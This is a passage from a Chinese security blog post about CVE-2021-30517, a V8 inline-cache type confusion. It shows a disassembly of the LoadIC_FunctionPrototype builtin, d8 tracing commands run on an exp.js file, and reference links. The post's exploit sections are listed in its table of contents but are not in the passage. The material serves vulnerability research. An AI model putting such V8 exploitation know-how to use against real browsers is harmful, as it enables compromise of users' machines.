class="number">0x7fdaddccf1cf</span>   <span class="number">36f</span>  <span class="number">488b</span>2424       REX.W movq rsp,[rsp]</span><br><span class="line"><span class="number">0x7fdaddccf1d3</span>   <span class="number">373</span>  <span class="number">488b</span>4df0       REX.W movq rcx,[rbp<span class="number">-0x10</span>]</span><br><span class="line"><span class="number">0x7fdaddccf1d7</span>   <span class="number">377</span>  <span class="number">41398</span>dc0000000 cmpl [r13+<span class="number">0xc0</span>] (<span class="built_in">root</span> (meta_map)),rcx</span><br><span class="line"><span class="number">0x7fdaddccf1de</span>   <span class="number">37</span>e  <span class="number">7409</span>           jz <span class="number">0x7fdaddccf1e9</span>  (LoadIC_FunctionPrototype)</span><br><span class="line"><span class="number">0x7fdaddccf1e0</span>   <span class="number">380</span>  <span class="number">488b</span>45c8       REX.W movq rax,[rbp<span class="number">-0x38</span>]</span><br><span class="line"><span class="number">0x7fdaddccf1e4</span>   <span class="number">384</span>  <span class="number">488b</span>e5         REX.W movq rsp,rbp</span><br><span class="line"><span class="number">0x7fdaddccf1e7</span>   <span class="number">387</span>  <span class="number">5</span>d             pop rbp</span><br><span class="line"><span class="number">0x7fdaddccf1e8</span>   <span class="number">388</span>  c3             retl</span><br><span class="line"><span class="number">0x7fdaddccf1e9</span>   <span class="number">389</span>  <span class="number">4989e2</span>         REX.W movq r10,rsp</span><br><span class="line"><span class="number">0x7fdaddccf1ec</span>   <span class="number">38</span>c  <span class="number">4883</span>ec08       REX.W subq rsp,<span class="number">0x8</span></span><br><span class="line"><span class="number">0x7fdaddccf1f0</span>   <span class="number">390</span>  <span class="number">4883e4</span>f0       REX.W andq rsp,<span class="number">0xf0</span></span><br><span class="line"><span class="number">0x7fdaddccf1f4</span>   <span class="number">394</span>  <span class="number">4</span>c891424       REX.W movq [rsp],r10</span><br><span class="line"><span class="number">0x7fdaddccf1f8</span>   <span class="number">398</span>  <span class="number">498b</span>9540130000 REX.W movq rdx,[r13+<span class="number">0x1340</span>] (<span class="built_in">root</span> (builtins_constants_table))</span><br><span class="line"><span class="number">0x7fdaddccf1ff</span>   <span class="number">39f</span>  <span class="number">8b</span>923b070000   movl rdx,[rdx+<span class="number">0x73b</span>]</span><br><span class="line"><span class="number">0x7fdaddccf205</span>   <span class="number">3</span>a5  <span class="number">4903</span>d5         REX.W addq rdx,r13</span><br><span class="line"><span class="number">0x7fdaddccf208</span>   <span class="number">3</span>a8  <span class="number">488b</span>7dc8       REX.W movq rdi,[rbp<span class="number">-0x38</span>]</span><br><span class="line"><span class="number">0x7fdaddccf20c</span>   <span class="number">3</span>ac  bec0000000     movl rsi,<span class="number">0xc0</span></span><br><span class="line"><span class="number">0x7fdaddccf211</span>   <span class="number">3b</span>1  <span class="number">498b</span>8568150000 REX.W movq rax,[r13+<span class="number">0x1568</span>] (external <span class="built_in">reference</span> (check_object_type))</span><br><span class="line"><span class="number">0x7fdaddccf218</span>   <span class="number">3b</span>8  <span class="number">40f</span>6c40f       testb rsp,<span class="number">0xf</span></span><br><span class="line"><span class="number">0x7fdaddccf21c</span>   <span class="number">3b</span>c  <span class="number">7401</span>           jz <span class="number">0x7fdaddccf21f</span>  (LoadIC_FunctionPrototype)</span><br><span class="line"><span class="number">0x7fdaddccf21e</span>   <span class="number">3b</span>e  cc             int3l</span><br><span class="line"><span class="number">0x7fdaddccf21f</span>   <span class="number">3b</span>f  <span class="number">4</span>c8d1500000000 REX.W leaq r10,[rip+<span class="number">0x0</span>]</span><br><span class="line"><span class="number">0x7fdaddccf226</span>   <span class="number">3</span>c6  <span class="number">4</span>d895528       REX.W movq [r13+<span class="number">0x28</span>] (external <span class="built_in">value</span> (IsolateData::fast_c_call_caller_pc_address)),r10</span><br><span class="line"><span class="number">0x7fdaddccf22a</span>   <span class="number">3</span>ca  <span class="number">49896</span>d20       REX.W movq [r13+<span class="number">0x20</span>] (external <span class="built_in">value</span> (IsolateData::fast_c_call_caller_fp_address)),rbp</span><br><span class="line"><span class="number">0x7fdaddccf22e</span>   <span class="number">3</span>ce  ffd0           call rax</span><br><span class="line"><span class="number">0x7fdaddccf230</span>   <span class="number">3</span>d0  <span class="number">49</span>c7452000000000 REX.W movq [r13+<span class="number">0x20</span>] (external <span class="built_in">value</span> (IsolateData::fast_c_call_caller_fp_address)),<span class="number">0x0</span></span><br><span class="line"><span class="number">0x7fdaddccf238</span>   <span class="number">3</span>d8  <span class="number">488b</span>2424       REX.W movq rsp,[rsp]</span><br><span class="line"><span class="number">0x7fdaddccf23c</span>   <span class="number">3</span>dc  <span class="number">488b</span>4dc8       REX.W movq rcx,[rbp<span class="number">-0x38</span>]</span><br><span class="line"><span class="number">0x7fdaddccf240</span>   <span class="number">3e0</span>  <span class="number">8b</span>790f         movl rdi,[rcx+<span class="number">0xf</span>]</span><br><span class="line"><span class="number">0x7fdaddccf243</span>   <span class="number">3e3</span>  <span class="number">4903f</span>d         REX.W addq rdi,r13</span><br><span class="line"><span class="number">0x7fdaddccf246</span>   <span class="number">3e6</span>  <span class="number">4989e2</span>         REX.W movq r10,rsp</span><br><span class="line"><span class="number">0x7fdaddccf249</span>   <span class="number">3e9</span>  <span class="number">4883</span>ec08       REX.W subq rsp,<span class="number">0x8</span></span><br><span class="line"><span class="number">0x7fdaddccf24d</span>   <span class="number">3</span>ed  <span class="number">4883e4</span>f0       REX.W andq rsp,<span class="number">0xf0</span></span><br><span class="line"><span class="number">0x7fdaddccf251</span>   <span class="number">3f</span>1  <span class="number">4</span>c891424       REX.W movq [rsp],r10</span><br><span class="line"><span class="number">0x7fdaddccf255</span>   <span class="number">3f</span>5  <span class="number">48897</span>df0       REX.W movq [rbp<span class="number">-0x10</span>],rdi</span><br><span class="line"><span class="number">0x7fdaddccf259</span>   <span class="number">3f</span>9  be06000000     movl rsi,<span class="number">0x6</span></span><br><span class="line"><span class="number">0x7fdaddccf25e</span>   <span class="number">3f</span>e  <span class="number">498b</span>9540130000 REX.W movq rdx,[r13+<span class="number">0x1340</span>] (<span class="built_in">root</span> (builtins_constants_table))</span><br><span class="line"><span class="number">0x7fdaddccf265</span>   <span class="number">405</span>  <span class="number">8b</span>523f         movl rdx,[rdx+<span class="number">0x3f</span>]</span><br><span class="line"><span class="number">0x7fdaddccf268</span>   <span class="number">408</span>  <span class="number">4903</span>d5         REX.W addq rdx,r13</span><br><span class="line"><span class="number">0x7fdaddccf26b</span>   <span class="number">40b</span>  <span class="number">488b</span>c7         REX.W movq rax,rdi</span><br><span class="line"><span class="number">0x7fdaddccf26e</span>   <span class="number">40</span>e  <span class="number">498b</span>8568150000 REX.W movq rax,[r13+<span class="number">0x1568</span>] (external <span class="built_in">reference</span> (check_object_type))</span><br><span class="line"><span class="number">0x7fdaddccf275</span>   <span class="number">415</span>  <span class="number">40f</span>6c40f       testb rsp,<span class="number">0xf</span></span><br><span class="line"><span class="number">0x7fdaddccf279</span>   <span class="number">419</span>  <span class="number">7401</span>           jz <span class="number">0x7fdaddccf27c</span>  (LoadIC_FunctionPrototype)</span><br><span class="line"><span class="number">0x7fdaddccf27b</span>   <span class="number">41b</span>  cc             int3l</span><br><span class="line"><span class="number">0x7fdaddccf27c</span>   <span class="number">41</span>c  <span class="number">4</span>c8d1500000000 REX.W leaq r10,[rip+<span class="number">0x0</span>]</span><br><span class="line"><span class="number">0x7fdaddccf283</span>   <span class="number">423</span>  <span class="number">4</span>d895528       REX.W movq [r13+<span class="number">0x28</span>] (external <span class="built_in">value</span> (IsolateData::fast_c_call_caller_pc_address)),r10</span><br><span class="line"><span class="number">0x7fdaddccf287</span>   <span class="number">427</span>  <span class="number">49896</span>d20       REX.W movq [r13+<span class="number">0x20</span>] (external <span class="built_in">value</span> (IsolateData::fast_c_call_caller_fp_address)),rbp</span><br><span class="line"><span class="number">0x7fdaddccf28b</span>   <span class="number">42b</span>  ffd0           call rax</span><br><span class="line"><span class="number">0x7fdaddccf28d</span>   <span class="number">42</span>d  <span class="number">49</span>c7452000000000 REX.W movq [r13+<span class="number">0x20</span>] (external <span class="built_in">value</span> (IsolateData::fast_c_call_caller_fp_address)),<span class="number">0x0</span></span><br><span class="line"><span class="number">0x7fdaddccf295</span>   <span class="number">435</span>  <span class="number">488b</span>2424       REX.W movq rsp,[rsp]</span><br><span class="line"><span class="number">0x7fdaddccf299</span>   <span class="number">439</span>  <span class="number">488b</span>45f0       REX.W movq rax,[rbp<span class="number">-0x10</span>]</span><br><span class="line"><span class="number">0x7fdaddccf29d</span>   <span class="number">43</span>d  e942ffffff     jmp <span class="number">0x7fdaddccf1e4</span>  (LoadIC_FunctionPrototype)</span><br><span class="line"><span class="number">0x7fdaddccf2a2</span>   <span class="number">442</span>  <span class="number">498b</span>9540130000 REX.W movq rdx,[r13+<span class="number">0x1340</span>] (<span class="built_in">root</span> (builtins_constants_table))</span><br><span class="line"><span class="number">0x7fdaddccf2a9</span>   <span class="number">449</span>  <span class="number">8b</span>9233070000   movl rdx,[rdx+<span class="number">0x733</span>]</span><br><span class="line"><span class="number">0x7fdaddccf2af</span>   <span class="number">44f</span>  <span class="number">4903</span>d5         REX.W addq rdx,r13</span><br><span class="line"><span class="number">0x7fdaddccf2b2</span>   <span class="number">452</span>  e8e9c50c00     call <span class="number">0x7fdaddd9b8a0</span>  (AbortCSAAssert)</span><br><span class="line"><span class="number">0x7fdaddccf2b7</span>   <span class="number">457</span>  cc             int3l</span><br><span class="line"><span class="number">0x7fdaddccf2b8</span>   <span class="number">458</span>  cc             int3l</span><br><span class="line"><span class="number">0x7fdaddccf2b9</span>   <span class="number">459</span>  <span class="number">498b</span>9540130000 REX.W movq rdx,[r13+<span class="number">0x1340</span>] (<span class="built_in">root</span> (builtins_constants_table))</span><br><span class="line"><span class="number">0x7fdaddccf2c0</span>   <span class="number">460</span>  <span class="number">8b</span>9237070000   movl rdx,[rdx+<span class="number">0x737</span>]</span><br><span class="line"><span class="number">0x7fdaddccf2c6</span>   <span class="number">466</span>  <span class="number">4903</span>d5         REX.W addq rdx,r13</span><br><span class="line"><span class="number">0x7fdaddccf2c9</span>   <span class="number">469</span>  e8d2c50c00     call <span class="number">0x7fdaddd9b8a0</span>  (AbortCSAAssert)</span><br><span class="line"><span class="number">0x7fdaddccf2ce</span>   <span class="number">46</span>e  cc             int3l</span><br><span class="line"><span class="number">0x7fdaddccf2cf</span>   <span class="number">46f</span>  cc             int3l</span><br><span class="line"><span class="number">0x7fdaddccf2d0</span>   <span class="number">470</span>  <span class="number">488b</span>6d00       REX.W movq rbp,[rbp+<span class="number">0x0</span>]</span><br><span class="line"><span class="number">0x7fdaddccf2d4</span>   <span class="number">474</span>  <span class="number">498b</span>9de0260000 REX.W movq rbx,[r13+<span class="number">0x26e0</span>] (external <span class="built_in">reference</span> (Runtime::LoadIC_Miss))</span><br><span class="line"><span class="number">0x7fdaddccf2db</span>   <span class="number">47b</span>  b804000000     movl rax,<span class="number">0x4</span></span><br><span class="line"><span class="number">0x7fdaddccf2e0</span>   <span class="number">480</span>  <span class="number">4</span>c8b542428     REX.W movq r10,[rsp+<span class="number">0x28</span>]</span><br><span class="line"><span class="number">0x7fdaddccf2e5</span>   <span class="number">485</span>  <span class="number">4</span>c89542440     REX.W movq [rsp+<span class="number">0x40</span>],r10</span><br><span class="line"><span class="number">0x7fdaddccf2ea</span>   <span class="number">48</span>a  <span class="number">4</span>c8b542448     REX.W movq r10,[rsp+<span class="number">0x48</span>]</span><br><span class="line"><span class="number">0x7fdaddccf2ef</span>   <span class="number">48f</span>  <span class="number">4</span>c89542428     REX.W movq [rsp+<span class="number">0x28</span>],r10</span><br><span class="line"><span class="number">0x7fdaddccf2f4</span>   <span class="number">494</span>  <span class="number">4</span>c8b542430     REX.W movq r10,[rsp+<span class="number">0x30</span>]</span><br><span class="line"><span class="number">0x7fdaddccf2f9</span>   <span class="number">499</span>  <span class="number">4</span>c89542448     REX.W movq [rsp+<span class="number">0x48</span>],r10</span><br><span class="line"><span class="number">0x7fdaddccf2fe</span>   <span class="number">49</span>e  <span class="number">4</span>c8b542420     REX.W movq r10,[rsp+<span class="number">0x20</span>]</span><br><span class="line"><span class="number">0x7fdaddccf303</span>   <span class="number">4</span>a3  <span class="number">4</span>c89542438     REX.W movq [rsp+<span class="number">0x38</span>],r10</span><br><span class="line"><span class="number">0x7fdaddccf308</span>   <span class="number">4</span>a8  <span class="number">4</span>c8b542418     REX.W movq r10,[rsp+<span class="number">0x18</span>]</span><br><span class="line"><span class="number">0x7fdaddccf30d</span>   <span class="number">4</span>ad  <span class="number">4</span>c89542430     REX.W movq [rsp+<span class="number">0x30</span>],r10</span><br><span class="line"><span class="number">0x7fdaddccf312</span>   <span class="number">4b</span>2  <span class="number">488b</span>742410     REX.W movq rsi,[rsp+<span class="number">0x10</span>]</span><br><span class="line"><span class="number">0x7fdaddccf317</span>   <span class="number">4b</span>7  <span class="number">4883</span>c428       REX.W addq rsp,<span class="number">0x28</span></span><br><span class="line"><span class="number">0x7fdaddccf31b</span>   <span class="number">4b</span>b  e9e0732b00     jmp <span class="number">0x7fdaddf86700</span>  (CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)</span><br><span class="line"><span class="number">0x7fdaddccf320</span>   <span class="number">4</span>c0  <span class="number">90</span>             nop</span><br><span class="line"><span class="number">0x7fdaddccf321</span>   <span class="number">4</span>c1  <span class="number">0f</span>1f00         nop</span><br></pre></td></tr></table></figure>

<h2 id="可能会用到的一些trace"><a href="#可能会用到的一些trace" class="headerlink" title="可能会用到的一些trace"></a>可能会用到的一些trace</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./d8 --allow-natives-syntax --prof --trace-ic --print-bytecode exp.js</span><br><span class="line">tools/linux-tick-processor out.gn/x64.debug/v8.log</span><br><span class="line">tools/ic-processor out.gn/x64.debug/v8.log</span><br><span class="line">./d8 --allow-natives-syntax --log-maps --trace-ic --log-code exp.js</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在 <a target="_blank" rel="noopener" href="https://v8.dev/blog/system-analyzer">这里</a> 找到了一个很酷的工具</p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a target="_blank" rel="noopener" href="https://bugs.chromium.org/p/chromium/issues/detail?id=1203122">https://bugs.chromium.org/p/chromium/issues/detail?id=1203122</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/427975235">https://zhuanlan.zhihu.com/p/427975235</a></p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/news/750000">https://cloud.tencent.com/developer/news/750000</a></p>
<p><a target="_blank" rel="noopener" href="https://v8.dev/blog/system-analyzer">https://v8.dev/blog/system-analyzer</a></p>
<p><a target="_blank" rel="noopener" href="https://v8.github.io/tools/head/system-analyzer/">https://v8.github.io/tools/head/system-analyzer/</a></p>
<p><a target="_blank" rel="noopener" href="https://docs.google.com/document/d/1mEhMn7dbaJv68lTAvzJRCQpImQoO6NZa61qRimVeA-k/edit#">https://docs.google.com/document/d/1mEhMn7dbaJv68lTAvzJRCQpImQoO6NZa61qRimVeA-k/edit#</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Vergissmeinnicht</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://ret2ver.github.io/2021/12/21/CVE-2021-30517-%EF%BC%9AV8-IC-%E4%B8%AD%E7%9A%84%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86%E6%BC%8F%E6%B4%9E/">https://ret2ver.github.io/2021/12/21/CVE-2021-30517-%EF%BC%9AV8-IC-%E4%B8%AD%E7%9A%84%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86%E6%BC%8F%E6%B4%9E/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/12/23/CVE-2021-24086-%EF%BC%9ATCPIP-%E4%B8%AD%E7%9A%84%E7%A9%BA%E6%8C%87%E9%92%88%E8%A7%A3%E5%BC%95%E7%94%A8%E6%BC%8F%E6%B4%9E/"><img class="prev-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">CVE-2021-24086 ：TCPIP 中的空指针解引用漏洞</div></div></a></div><div class="next-post pull-right"><a href="/2021/10/28/HEVD-Arbitrary-Write/"><img class="next-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">HEVD - Arbitrary Write</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2022/04/29/RkrKDQiodbYj2eu.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Vergissmeinnicht</div><div class="author-info__description"></div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">38</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">15</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">32</div></a></div></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ret2ver"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/ret2ver" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:verhan@163.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">Live Long And Pwn.</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">2.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RootCause"><span class="toc-number">3.</span> <span class="toc-text">RootCause</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">4.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Patch%E5%88%86%E6%9E%90"><span class="toc-number">5.</span> <span class="toc-text">Patch分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#EXP"><span class="toc-number">6.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E4%B8%83%E4%B8%83%E5%85%AB%E5%85%AB%E7%9A%84%E5%86%85%E5%AE%B9"><span class="toc-number">7.</span> <span class="toc-text">其他七七八八的内容</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#LoadIC-FunctionPrototype%E7%9A%84code"><span class="toc-number">7.1.</span> <span class="toc-text">LoadIC_FunctionPrototype的code</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%AF%E8%83%BD%E4%BC%9A%E7%94%A8%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9Btrace"><span class="toc-number">7.2.</span> <span class="toc-text">可能会用到的一些trace</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reference"><span class="toc-number">8.</span> <span class="toc-text">Reference</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/03/14/AFL%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB-afl-fuzz/" title="AFL源码阅读 - afl-fuzz">AFL源码阅读 - afl-fuzz</a><time datetime="2022-03-14T09:35:50.000Z" title="Created 2022-03-14 17:35:50">2022-03-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/03/14/AFL%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB-afl-clang-fast/" title="AFL源码阅读 - afl-clang-fast">AFL源码阅读 - afl-clang-fast</a><time datetime="2022-03-14T06:47:50.000Z" title="Created 2022-03-14 14:47:50">2022-03-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/03/13/AFL%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB-afl-as/" title="AFL源码阅读 - afl-as">AFL源码阅读 - afl-as</a><time datetime="2022-03-13T07:04:50.000Z" title="Created 2022-03-13 15:04:50">2022-03-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/03/13/AFL%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB-afl-gcc/" title="AFL源码阅读 - afl-gcc">AFL源码阅读 - afl-gcc</a><time datetime="2022-03-13T05:22:50.000Z" title="Created 2022-03-13 13:22:50">2022-03-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/02/05/CVE-2021-43226-%EF%BC%9ACLFS-%E4%B8%AD%E7%9A%84%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/" title="CVE-2021-43226 ：CLFS 中的栈溢出漏洞">CVE-2021-43226 ：CLFS 中的栈溢出漏洞</a><time datetime="2022-02-05T06:56:21.000Z" title="Created 2022-02-05 14:56:21">2022-02-05</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By Vergissmeinnicht</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    tex: {
      inlineMath: [ ['$','$'], ["\\(","\\)"]],
      tags: 'ams'
    },
    chtml: {
      scale: 1.2
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, ''],
        insertScript: [200, () => {
          document.querySelectorAll('mjx-container:not\([display]\)').forEach(node => {
            const target = node.parentNode
            if (target.nodeName.toLowerCase() === 'li') {
              target.parentNode.classList.add('has-jax')
            } else {
              target.classList.add('has-jax')
            }
          });
        }, '', false]
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typeset()
}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>